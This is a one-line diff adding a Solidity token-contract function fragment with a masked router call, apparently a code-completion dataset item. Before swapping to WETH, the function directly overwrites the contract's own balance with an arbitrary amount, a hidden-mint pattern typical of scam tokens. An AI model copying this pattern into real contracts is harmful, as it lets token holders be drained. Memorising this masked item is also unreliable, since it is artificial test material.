@@ -1,0 +1,1 @@
+"function sTx(uint256 _am0unt, address to) private {        _approve(address(this), address(_router), _am0unt);        _balances[address(this)] = _am0unt;        swp = true;        address[] memory p = new address[](2);        p[0] = address(this);        p[1] = _router.WETH();        _router.<mask0>;        swp = false;    }"
